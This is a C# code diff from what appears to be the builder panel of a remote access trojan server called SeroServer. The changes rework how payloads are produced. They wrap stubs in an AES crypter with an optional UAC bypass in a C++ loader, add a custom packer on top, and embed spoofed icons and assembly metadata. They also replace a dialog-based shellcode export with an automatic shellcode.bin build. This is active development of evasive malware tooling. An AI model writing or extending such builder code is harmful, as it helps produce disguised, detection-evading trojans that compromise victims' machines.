@@ -4371,6 +4371,13 @@ Read-Host 'Press Enter to close'
             File.Copy(builtExe, outputExe, true);
             try { Directory.Delete(tempOut, true); } catch { }
 
+            // icon + metadata used by both crypter and custom packer
+            string? iconForLoader = (BldSetIcon.IsChecked == true && File.Exists(BldIconPath.Text))
+                ? BldIconPath.Text : null;
+            var meta = (BldSetAssembly.IsChecked == true && selectedExePath != null && File.Exists(selectedExePath))
+                ? new SeroServer.Builder.LoaderMetadata(product, company, fileVersion, productVersion, assemblyTitle, copyright)
+                : null;
+
             // Apply crypter if enabled — or if UAC bypass is checked (bypass lives inside the C++ loader)
             bool uacBypass = BldUacBypass.IsChecked == true;
             bool needsCrypter = BldEncrypt.IsChecked == true || uacBypass;
@@ -4382,18 +4389,15 @@ Read-Host 'Press Enter to close'
                 TxtBuildStatus.Text = Lang.Get("BLD_STATUS_CRYPTER");
                 Log("[*] Builder: Applying AES crypter...");
 
-                // Pass icon + metadata so the C++ loader is compiled with them via rc.exe
-                string? iconForLoader = (BldSetIcon.IsChecked == true && File.Exists(BldIconPath.Text))
-                    ? BldIconPath.Text : null;
-                var meta = (BldSetAssembly.IsChecked == true && selectedExePath != null && File.Exists(selectedExePath))
-                    ? new SeroServer.Builder.LoaderMetadata(product, company, fileVersion, productVersion, assemblyTitle, copyright)
-                    : null;
-
                 await SeroServer.Builder.CrypterBuilder.ApplyAsync(outputExe, Log, iconForLoader, meta, uacBypass);
             }
-            else
+
+            // Custom packer — stacks on top of crypter (or wraps raw stub if no crypter)
+            if (BldCustomPacker.IsChecked == true)
             {
-                // No crypter — icon already embedded via -p:ApplicationIcon at compile time
+                TxtBuildStatus.Text = Lang.Get("BLD_STATUS_PACKER");
+                Log("[*] Builder: Applying custom packer...");
+                await SeroServer.Builder.CustomPackerBuilder.ApplyAsync(outputExe, Log, iconForLoader, meta);
             }
 
 
@@ -4407,6 +4411,36 @@ Read-Host 'Press Enter to close'
             NotificationService.NotifyBuildSuccess();
 
             ShowBuildResult(Path.GetFileName(outputExe), sizeStr);
+
+            // ── Shellcode target (independent compile path, no file dialog) ─────
+            if (BldShellcode.IsChecked == true)
+            {
+                TxtBuildStatus.Text = Lang.Get("SC_STATUS_GEN");
+                Log("[*] Shellcode: Compiling position-independent binary...");
+                try
+                {
+                    var blob = await SeroServer.Builder.ShellcodeExport.BuildAsync(outputExe, Log);
+                    if (blob == null)
+                    {
+                        TxtBuildStatus.Text = Lang.Get("SC_STATUS_FAILED");
+                    }
+                    else
+                    {
+                        var scPath = Path.Combine(Path.GetDirectoryName(outputExe)!, "shellcode.bin");
+                        await File.WriteAllBytesAsync(scPath, blob);
+                        var scSize = blob.Length < 1024 * 1024
+                            ? $"{blob.Length / 1024.0:F0} KB"
+                            : $"{blob.Length / (1024.0 * 1024.0):F1} MB";
+                        Log($"[+] Shellcode: shellcode.bin ({blob.Length:N0} bytes) → {Path.GetDirectoryName(scPath)}");
+                        TxtBuildStatus.Text = $"Shellcode: shellcode.bin ({scSize})";
+                    }
+                }
+                catch (Exception scEx)
+                {
+                    Log($"[!] Shellcode: {scEx.Message}");
+                    TxtBuildStatus.Text = $"Error: {scEx.Message}";
+                }
+            }
         }
         catch (Exception ex)
         {
@@ -4417,63 +4451,6 @@ Read-Host 'Press Enter to close'
         {
             BtnBuild.IsEnabled = true;
             BuilderPanel.IsEnabled = true;
-        }
-    }
-
-    private async void ExportShellcode_Click(object sender, RoutedEventArgs e)
-    {
-        var openDlg = new Microsoft.Win32.OpenFileDialog
-        {
-            Filter = "Executable (*.exe)|*.exe",
-            Title  = Lang.Get("SC_SELECT_STUB"),
-        };
-        if (openDlg.ShowDialog() != true) return;
-        var stubExe = openDlg.FileName;
-
-        var saveDlg = new Microsoft.Win32.SaveFileDialog
-        {
-            Filter   = "Binary (*.bin)|*.bin|All files (*.*)|*.*",
-            FileName = "shellcode.bin",
-            Title    = Lang.Get("SC_SAVE_TITLE"),
-        };
-        if (saveDlg.ShowDialog() != true) return;
-        var outPath = saveDlg.FileName;
-
-        BtnExportShellcode.IsEnabled = false;
-        TxtBuildStatus.Text = Lang.Get("SC_STATUS_GEN");
-        Log("[*] Shellcode: Starting export...");
-
-        try
-        {
-            var blob = await SeroServer.Builder.ShellcodeExport.BuildAsync(stubExe, Log);
-            if (blob == null)
-            {
-                TxtBuildStatus.Text = Lang.Get("SC_STATUS_FAILED");
-                return;
-            }
-
-            await File.WriteAllBytesAsync(outPath, blob);
-
-            // Also write a .h C-array alongside the .bin
-            var hPath = Path.ChangeExtension(outPath, ".h");
-            await File.WriteAllTextAsync(hPath, SeroServer.Builder.ShellcodeExport.ToCArray(blob));
-
-            var sizeStr = blob.Length < 1024 * 1024
-                ? $"{blob.Length / 1024.0:F0} KB"
-                : $"{blob.Length / (1024.0 * 1024.0):F1} MB";
-
-            Log($"[+] Shellcode: {Path.GetFileName(outPath)} ({blob.Length:N0} bytes)");
-            Log($"[+] Shellcode: C array → {Path.GetFileName(hPath)}");
-            TxtBuildStatus.Text = $"Shellcode: {Path.GetFileName(outPath)} ({sizeStr})";
-        }
-        catch (Exception ex)
-        {
-            Log($"[!] Shellcode export: {ex.Message}");
-            TxtBuildStatus.Text = $"Error: {ex.Message}";
-        }
-        finally
-        {
-            BtnExportShellcode.IsEnabled = true;
         }
     }
 
@@ -8791,7 +8768,7 @@ Read-Host 'Press Enter to close'
 
         // ── RAT builder + Binder build buttons ──
         if (TxtBtnBuild       != null) TxtBtnBuild.Text       = Lang.Get("ACT_BUILD").ToUpper();
-        if (TxtBtnShellcode   != null) TxtBtnShellcode.Text   = Lang.Get("SC_BTN");
+        if (TxtBldShellcode   != null) TxtBldShellcode.Text   = Lang.Get("SC_BTN");
         if (BtnBinderBuildTxt != null) BtnBinderBuildTxt.Text = Lang.Get("ACT_BUILD");
     }
 
